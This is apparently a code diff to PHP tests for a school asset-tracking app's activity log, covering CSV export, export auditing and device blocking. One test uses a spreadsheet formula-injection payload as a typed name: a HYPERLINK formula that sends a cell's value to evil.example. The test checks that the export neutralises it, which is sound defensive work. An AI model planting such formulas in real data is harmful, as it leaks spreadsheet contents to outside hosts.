@@ -1,9 +1,12 @@
 <?php
 
+use App\Enums\ActorType;
+use App\Enums\AssetCondition;
 use App\Models\Asset;
 use App\Models\AssetEvent;
 use App\Models\BlockedDevice;
 use App\Models\Room;
+use App\Models\RoomContent;
 use App\Models\User;
 use App\Services\AuditLogger;
 use App\Support\Actor;
@@ -76,8 +79,8 @@ it('filters by who and by date', function () {
     $asset = Asset::factory()->create();
     $logger = app(AuditLogger::class);
 
-    $logger->record($asset, EventAction::ASSET_CREATED, [], new Actor(\App\Enums\ActorType::Staff, null, 'Arben Krasniqi'));
-    $logger->record($asset, EventAction::ASSET_EDITED, [], new Actor(\App\Enums\ActorType::Staff, null, 'Someone Else'));
+    $logger->record($asset, EventAction::ASSET_CREATED, [], new Actor(ActorType::Staff, null, 'Arben Krasniqi'));
+    $logger->record($asset, EventAction::ASSET_EDITED, [], new Actor(ActorType::Staff, null, 'Someone Else'));
 
     expect($this->actingAs($this->admin)
         ->get(route('admin.activity.index', ['who' => 'Arben']))
@@ -138,6 +141,48 @@ it('blocks a device straight from the log, and lets it back', function () {
     expect(BlockedDevice::blocks('abc123'))->toBeFalse();
 });
 
+it('keeps a typed name from running as a formula when the export is opened in Excel', function () {
+    // Anyone can type any name on a public page, and the director opens this
+    // file in a spreadsheet.
+    $asset = Asset::factory()->create();
+    app(AuditLogger::class)->record($asset, EventAction::REPORT_CREATED, [], new Actor(
+        ActorType::Public, null, '=HYPERLINK("https://evil.example/?"&A1,"Open")', 'tok',
+    ));
+
+    $csv = $this->actingAs($this->admin)->get(route('admin.activity.export'))->streamedContent();
+
+    $cells = collect(explode("\n", $csv))->filter()->flatMap(fn ($line) => str_getcsv($line));
+
+    expect($cells->contains(fn ($cell) => str_starts_with($cell, '=')))->toBeFalse()
+        ->and($csv)->toContain("'=HYPERLINK");
+});
+
+it('records who exported the log, and says in the file that it holds personal data', function () {
+    $asset = Asset::factory()->create();
+    $this->actingAs($this->admin);
+    app(AuditLogger::class)->record($asset, EventAction::ASSET_EDITED);
+
+    $csv = $this->get(route('admin.activity.export'))->streamedContent();
+
+    $event = AssetEvent::query()->where('action', EventAction::DATA_EXPORTED)->firstOrFail();
+
+    expect($event->actor_id)->toBe($this->admin->id)
+        ->and($event->meta)->toBe(['dataset' => 'activity', 'rows' => 1])
+        ->and($csv)->toContain('This file contains personal data')
+        ->and($csv)->toContain($this->admin->name);
+});
+
+it('logs who blocked and unblocked a device', function () {
+    $this->actingAs($this->admin)
+        ->post(route('admin.activity.block'), ['device_token' => 'abc123', 'note' => 'Joke reports']);
+
+    $this->actingAs($this->admin)
+        ->delete(route('admin.activity.unblock', BlockedDevice::query()->firstOrFail()));
+
+    expect(AssetEvent::query()->where('action', EventAction::DEVICE_BLOCKED)->firstOrFail()->meta['device_token'])->toBe('abc123')
+        ->and(AssetEvent::query()->where('action', EventAction::DEVICE_UNBLOCKED)->exists())->toBeTrue();
+});
+
 it('says so plainly when nothing has happened', function () {
     $this->actingAs($this->admin)
         ->get(route('admin.activity.index'))
@@ -148,7 +193,7 @@ it('says so plainly when nothing has happened', function () {
 it('produces a room inventory sheet with a line per item and blanks to write on', function () {
     $room = Room::factory()->create(['name' => 'Room 12']);
     $asset = Asset::factory()->create(['room_id' => $room->id, 'name' => 'Epson projector']);
-    \App\Models\RoomContent::factory()->create([
+    RoomContent::factory()->create([
         'room_id' => $room->id,
         'item_name' => 'Student desk',
         'quantity' => 28,
@@ -181,7 +226,7 @@ it('counts furniture per room rather than labelling each chair', function () {
         ->post(route('admin.rooms.contents.store', $room), [
             'item_name' => 'Chair',
             'quantity' => 30,
-            'condition' => \App\Enums\AssetCondition::Good->value,
+            'condition' => AssetCondition::Good->value,
         ])
         ->assertRedirect();
 
@@ -191,7 +236,7 @@ it('counts furniture per room rather than labelling each chair', function () {
 
 it('removes a furniture line when its count drops to zero', function () {
     $room = Room::factory()->create();
-    $content = \App\Models\RoomContent::factory()->create(['room_id' => $room->id]);
+    $content = RoomContent::factory()->create(['room_id' => $room->id]);
 
     $this->actingAs($this->admin)
         ->put(route('admin.rooms.contents.update', [$room, $content]), ['quantity' => 0])
